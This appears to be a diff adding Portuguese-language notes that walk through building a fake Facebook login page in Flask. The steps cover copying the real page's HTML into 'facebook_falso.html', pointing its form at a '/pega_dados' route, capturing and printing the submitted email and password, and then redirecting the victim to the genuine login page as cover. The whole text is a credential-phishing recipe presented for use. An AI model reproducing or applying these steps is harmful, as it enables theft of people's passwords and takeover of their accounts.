@@ -1,0 +1,27 @@
+importar o flask
+
+iniciar o flask "app = Flask(__name__)" --> sem as aspas
+
+copiar o código fonte de uma página e colar em um arquivo html dentro de uma pasta "templates"
+
+encontrar o "name" html de cada um dos campos, SENHA e EMAIL
+
+encontrar o form(dentro do vs code) apagar o "onsubmit" e o "ID"
+    Substituir o "method" para a classe (pega_dados)
+
+criar uma "rota"(route) "@app.route("/")" --> sem as aspas
+
+criar uma função que retorna o código fonte (armazenado em um arquivo html) "def pagina_inicial():                                 --> sem as aspas
+                                                                                return render_template("facebook_falso.html")"
+
+criar outra rota "@app.route("/pega_dados", methods=["POST"])" --> sem as aspas 
+
+criar uma função pega dados 
+
+armazenar em variaveis os campos de senha e email (usando o "name" html)
+
+printar as variaveis
+
+retornar a página de login real da página verdadeira (só enfeite)
+
+fora de tudo usar "app.run()" --> sem as aspas
